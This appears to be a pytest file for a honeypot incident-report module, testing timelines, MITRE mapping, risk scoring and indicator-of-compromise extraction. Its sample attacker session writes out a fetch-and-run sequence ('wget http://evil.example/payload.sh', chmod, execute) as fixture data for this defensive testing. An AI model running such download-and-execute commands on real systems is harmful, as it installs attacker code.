import json

import pytest

from reporting.incident_report import (
    build_incident_report,
    write_incident_report,
)


def sample_analysis():
    commands = [
        "whoami",
        "wget http://evil.example/payload.sh",
        "chmod +x payload.sh",
        "./payload.sh",
    ]

    return {
        "session": {
            "session_id": "report-session-1",
            "source_ip": "192.0.2.50",
            "protocol": "ssh",
            "client_version": "SSH-2.0-OpenSSH_8.2",
            "hassh": "sample-hassh",
            "username": "admin",
            "authentication_success": False,
            "start_time": "2026-10-16T10:00:00+00:00",
            "end_time": "2026-10-16T10:00:20+00:00",
            "duration_ms": 20000,
            "commands": commands,
            "command_events": [
                {
                    "command": "whoami",
                    "timestamp": "2026-10-16T10:00:05+00:00",
                },
                {
                    "command": "wget http://evil.example/payload.sh",
                    "timestamp": "2026-10-16T10:00:10+00:00",
                },
                {
                    "command": "chmod +x payload.sh",
                    "timestamp": "2026-10-16T10:00:15+00:00",
                },
                {
                    "command": "./payload.sh",
                    "timestamp": "2026-10-16T10:00:18+00:00",
                },
            ],
        },
        "fingerprint": {
            "fingerprint_id": "fingerprint-1",
            "session_count": 1,
            "command_count": 4,
        },
        "intents": [
            {
                "intent": "discovery",
                "confidence": 0.9,
                "evidence": ["whoami"],
                "phase": "discovery",
            }
        ],
        "mitre_techniques": [
            {
                "technique_id": "T1033",
                "technique_name": "System Owner/User Discovery",
                "tactic": "Discovery",
                "evidence": ["whoami"],
            }
        ],
        "campaign": {
            "campaign_id": "campaign-1",
            "confidence_score": 75,
            "session_ids": ["report-session-1"],
        },
        "risk_assessment": {
            "session_id": "report-session-1",
            "score": 85,
            "severity": "critical",
            "factors": [
                {
                    "name": "payload_execution",
                    "score": 40,
                    "category": "execution",
                    "evidence": ["./payload.sh"],
                }
            ],
        },
        "recommended_actions": [
            {
                "name": "trigger_alert",
                "category": "alerting",
                "description": "Trigger a high-priority security alert.",
                "priority": 50,
                "enabled": True,
                "parameters": [],
            }
        ],
        "deception": {
            "enabled": False,
            "applied": False,
        },
    }


def test_report_contains_incident_and_session_summary():
    report = build_incident_report(
        sample_analysis(),
        generated_at="2026-10-16T12:00:00+00:00",
    )

    assert report["report_version"] == "1.0"
    assert report["generated_at"] == "2026-10-16T12:00:00+00:00"
    assert report["incident"]["incident_id"] == (
        "MORPHEUS-report-session-1"
    )
    assert report["incident"]["severity"] == "critical"
    assert report["incident"]["risk_score"] == 85

    assert report["session"]["source_ip"] == "192.0.2.50"
    assert report["session"]["command_count"] == 4
    assert report["fingerprint"]["fingerprint_id"] == "fingerprint-1"


def test_report_includes_timeline_and_mitre_mapping():
    report = build_incident_report(sample_analysis())

    commands = [
        item
        for item in report["timeline"]
        if item["event_type"] == "command"
    ]

    assert len(commands) == 4
    assert commands[0]["timestamp"] == "2026-10-16T10:00:05+00:00"
    assert commands[0]["technique_id"] == "T1033"
    assert report["mitre_attack"][0]["technique_id"] == "T1033"


def test_report_extracts_iocs_from_commands():
    report = build_incident_report(sample_analysis())

    iocs = report["indicators_of_compromise"]
    assert any(
        item["type"] == "url"
        and item["value"] == "http://evil.example/payload.sh"
        for item in iocs
    )
    assert any(
        item["type"] == "domain"
        and item["value"] == "evil.example"
        for item in iocs
    )


def test_report_preserves_campaign_risk_and_actions():
    report = build_incident_report(sample_analysis())

    assert report["campaign"]["campaign_id"] == "campaign-1"
    assert report["risk_assessment"]["factors"][0]["name"] == (
        "payload_execution"
    )
    assert report["recommended_actions"][0]["name"] == "trigger_alert"
    assert report["deception"]["applied"] is False


def test_report_handles_missing_optional_analysis_fields():
    analysis = {
        "session": {
            "session_id": "minimal-session",
            "commands": [],
            "command_events": [],
        }
    }

    report = build_incident_report(
        analysis,
        generated_at="2026-10-16T12:00:00+00:00",
    )

    assert report["session"]["session_id"] == "minimal-session"
    assert report["incident"]["severity"] == "unknown"
    assert report["campaign"] is None
    assert report["timeline"] == []
    assert report["indicators_of_compromise"] == []
    assert report["recommended_actions"] == []
    assert report["deception"] == {
        "enabled": False,
        "applied": False,
    }


def test_report_requires_a_session():
    with pytest.raises(ValueError, match="session object"):
        build_incident_report({"risk_assessment": {"score": 10}})


def test_report_rejects_invalid_session_id():
    with pytest.raises(ValueError, match="session_id"):
        build_incident_report(
            {"session": {"session_id": "", "commands": []}}
        )


def test_write_report_creates_json_file(tmp_path):
    output_path = tmp_path / "reports" / "incident.json"

    report = write_incident_report(
        sample_analysis(),
        str(output_path),
        generated_at="2026-10-16T12:00:00+00:00",
    )

    assert output_path.is_file()

    with output_path.open("r", encoding="utf-8") as report_file:
        saved_report = json.load(report_file)

    assert saved_report == report
    assert saved_report["session"]["session_id"] == "report-session-1"
